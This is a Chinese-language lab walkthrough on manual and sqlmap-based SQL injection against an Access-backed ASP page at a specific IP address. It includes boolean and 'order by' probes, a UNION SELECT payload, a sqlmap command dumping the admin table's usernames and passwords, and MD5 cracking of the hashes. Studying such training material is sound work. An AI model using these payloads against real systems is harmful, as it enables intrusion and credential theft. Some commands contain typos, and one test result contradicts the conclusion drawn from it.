Acccess数据库没有库这个概念，整个数据库只有一个库
库里面存在着各种表

数据库结构
库
表
字段
    数据





做题：
实训目标
```javascript
1.掌握SQL注入原理；
2.了解手工注入的方法；
3.了解Access的数据结构；
4.了解字符串的MD5加解密；
```
访问环境
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22404027/1640251643118-8ff96aba-f8d4-4bca-adc5-3a887cc46191.png#clientId=u334faae5-74b1-4&from=paste&height=389&id=u8e4f1001&name=image.png&originHeight=389&originWidth=832&originalType=binary&ratio=1&size=37037&status=done&style=stroke&taskId=ue4c6bb18-0a1b-434e-9a0a-8591f12554a&width=832)

```javascript
http://219.153.49.228:40149/new_list.asp?id=1
```
手动测试
判断注入点
```javascript
http://219.153.49.228:40149/new_list.asp?id=1 and 1=2  访问正常
http://219.153.49.228:40149/new_list.asp?id=1 and 1=1 访问正常 数字注入 存在漏洞
```
判断字段
```javascript
http://219.153.49.228:40149/new_list.asp?id=1 order by 9 正常
http://219.153.49.228:40149/new_list.asp?id=1 order by 10 报错

所以有9个字段
```
显示回显
```javascript
http://219.153.49.228:40149/new_list.asp?id=1 union select 1,2,3,4,5,6,7,8,9
```
成功回显

access手动测试太麻烦了 不可靠
直接使用工具 爆破 爆破列名
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22404027/1640252023095-59cebc09-e831-471a-96bf-daa1d8e7db7f.png#clientId=u334faae5-74b1-4&from=paste&height=490&id=ufc759828&name=image.png&originHeight=490&originWidth=714&originalType=binary&ratio=1&size=58297&status=done&style=stroke&taskId=u952cc781-1356-497e-b98a-21494ced0bf&width=714)

对密码密文进行MD5解码，得到密码明文
```javascript
cmd5.com
```
使用sqlmap工具 一把梭
```javascript
ssqlmap.py -u http://219.153.49.228:40916/new_list.asp?id=1 -T admin -C username,passwo --dump
```
sqlmap 也是调用自己字典中的三千多个常用列明进行测试而已


